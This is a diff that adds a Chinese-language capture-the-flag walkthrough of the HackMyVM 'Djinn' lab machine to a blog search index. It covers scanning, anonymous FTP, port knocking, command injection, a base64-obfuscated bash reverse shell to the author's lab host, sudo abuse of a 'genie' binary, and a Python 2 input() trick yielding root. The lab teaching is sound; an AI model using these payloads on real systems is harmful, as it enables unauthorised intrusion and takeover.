@@ -3438,4 +3438,54 @@ cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=
         <tag>靶机</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackmyVM-Djinn</title>
+    <url>/2025/05/06/HackmyVM-Djinn/</url>
+    <content><![CDATA[信息搜集┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)192.168.31.2    08:00:27:e7:50:e0       PCS Systemtechnik GmbH192.168.31.176  08:00:27:36:b4:d6       PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 3.098 seconds (82.63 hosts/sec). 3 respondeds
+
+192.168.31.176是靶机ip
+┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| || .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog         :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 04:49 EDTInitiating ARP Ping Scan at 04:49Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 04:49, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 04:49Completed Parallel DNS resolution of 1 host. at 04:49, 0.04s elapsedDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 04:49Scanning 192.168.31.176 [3 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Completed SYN Stealth Scan at 04:49, 0.02s elapsed (3 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00032s latency).Scanned at 2025-05-06 04:49:46 EDT for 0sPORT     STATE SERVICE REASON21/tcp   open  ftp     syn-ack ttl 641337/tcp open  waste   syn-ack ttl 647331/tcp open  swx     syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.26 seconds           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
+
+21端口21端口可以匿名登录，里面有三个文件
+┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# ftp anonymous@192.168.31.176Connected to 192.168.31.176.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||15556|)150 Here comes the directory listing.-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
+
+┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat creds.txtnitu:81299┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat game.txtoh and I forgot to tell you I&#x27;ve setup a game for you on port 1337. See if you can reach to thefinal level and get the prize.┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# cat message.txt@nitish81299 I am going on holidays for few days, please take care of all the work.And don&#x27;t mess up anything.
+
+给了一个用户名，一个账号密码，还有一个游戏部署在1337上
+1337端口nc连接是个口算题卡，写个脚本
+import reimport socketdef get_question(s):    data = s.recv(1024).decode()    print(data)    question_re=re.search(r&#x27;(\d.+)\)&#x27;,data)    if question_re:        question=question_re.group(1)        return question    else:        return Nonedef send_answer(s,answer):    print(answer)    s.sendall(answer.encode()+b&#x27;\n&#x27;)def main():    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    s.connect((&#x27;192.168.31.176&#x27;,1337))    for _ in range(1,1002):        question=get_question(s)        if not question:            continue        print(question)        answer = str(eval(question.replace(&#x27;,&#x27;,&#x27;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;)))        send_answer(s,answer)      s.close()if __name__ == &#x27;__main__&#x27;:    main()
+
+会给一个Here is your gift , I hope you know what to do with it: 1356, 6784, 3409knock一下
+┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# knock 192.168.31.176 1356 6784 3409┌──(root㉿kali)-[~/Desktop/tmp/tmp]└─# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| || .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog         :: https://github.com/RustScan/RustScan : --------------------------------------I scanned ports so fast, even my computer was surprised.[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:22Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 05:13 EDTInitiating ARP Ping Scan at 05:13Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 05:13, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 05:13Completed Parallel DNS resolution of 1 host. at 05:13, 0.00s elapsedDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 05:13Scanning 192.168.31.176 [4 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 22/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Completed SYN Stealth Scan at 05:13, 0.02s elapsed (4 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00043s latency).Scanned at 2025-05-06 05:13:30 EDT for 0sPORT     STATE SERVICE REASON21/tcp   open  ftp     syn-ack ttl 6422/tcp   open  ssh     syn-ack ttl 641337/tcp open  waste   syn-ack ttl 647331/tcp open  swx     syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.20 seconds           Raw packets sent: 5 (204B) | Rcvd: 5 (204B)
+
+现在22端口开了，但是之前给的账号密码不对
+7331端口看看7331端口是什么，扫一下目录，能扫到一个/wish,是一个执行命令的地方，输入命令执行之后会跳转http://192.168.31.176:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A命令确实是执行了，反弹个shell
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjEyOS80NDQ0IDA+JjE=|base64 -d |bash
+
+提权SAM在/home/nitish/.dev下有一个凭证
+www-data@djinn:/home/nitish/.dev$ cat creds.txtnitish:p4ssw0rdStr3r0n9
+
+nitish@djinn:~$ sudo -lMatching Defaults entries for nitish on djinn:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser nitish may run the following commands on djinn:    (sam) NOPASSWD: /usr/bin/genie
+
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -c &#x27;/bin/sh&#x27;Pass your wish to GOD, he might be able to help you.
+
+哈哈哈哈 -c不行，看看其他参数，man手册里还有一个-cmd的参数
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd idmy man!!$ 
+
+提权ROOTsam@djinn:~$ sudo -lMatching Defaults entries for sam on djinn:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sam may run the following commands on djinn:    (root) NOPASSWD: /root/lago
+
+sam的家目录下有一个.pyc,进行反编译
+#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7from getpass import getuserfrom os import systemfrom random import randintdef naughtyboi():    print &#x27;Working on it!! &#x27;def guessit():    num = randint(1, 101)    print &#x27;Choose a number between 1 to 100: &#x27;    s = input(&#x27;Enter your number: &#x27;)    if s == num:        system(&#x27;/bin/sh&#x27;)    else:        print &#x27;Better Luck next time&#x27;def readfiles():    user = getuser()    path = input(&#x27;Enter the full of the file to read: &#x27;)    print &#x27;User %s is not allowed to read %s&#x27; % (user, path)def options():    print &#x27;What do you want to do ?&#x27;    print &#x27;1 - Be naughty&#x27;    print &#x27;2 - Guess the number&#x27;    print &#x27;3 - Read some damn files&#x27;    print &#x27;4 - Work&#x27;    choice = int(input(&#x27;Enter your choice: &#x27;))    return choicedef main(op):    if op == 1:        naughtyboi()    elif op == 2:        guessit()    elif op == 3:        readfiles()    elif op == 4:        print &#x27;work your ass off!!&#x27;    else:        print &#x27;Do something better with your life&#x27;if __name__ == &#x27;__main__&#x27;:    main(options())
+
+可以直接传入一个num，他会将你传入的num解析成变量就可以通过了，或者就爆破我就不试了
+sam@djinn:/home/sam$ sudo /root/lagoWhat do you want to do ?1 - Be naughty2 - Guess the number3 - Read some damn files4 - WorkEnter your choice:2Choose a number between 1 to 100:Enter your number: num# iduid=0(root) gid=0(root) groups=0(root)
+
+]]></content>
+      <categories>
+        <category>HackMyVM</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
 </search>
